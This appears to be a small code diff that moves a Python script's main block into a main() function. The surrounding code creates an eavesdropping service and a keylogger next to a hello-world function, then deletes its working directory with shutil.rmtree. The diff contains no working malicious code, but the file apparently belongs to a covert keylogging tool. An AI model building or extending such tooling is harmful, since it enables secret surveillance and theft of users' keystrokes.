@@ -11,7 +11,7 @@ def print_hello_world(name):
     print(f'Hello, {name}')
 
 
-if __name__ == '__main__':
+def main():
     eavesdrop = EavesdropService()
     key_logger = KeyLogger(file_path)
 
@@ -34,3 +34,6 @@ if __name__ == '__main__':
         number_of_iterations += 1
 
     shutil.rmtree(file_path)
+
+if __name__ == '__main__':
+    main()
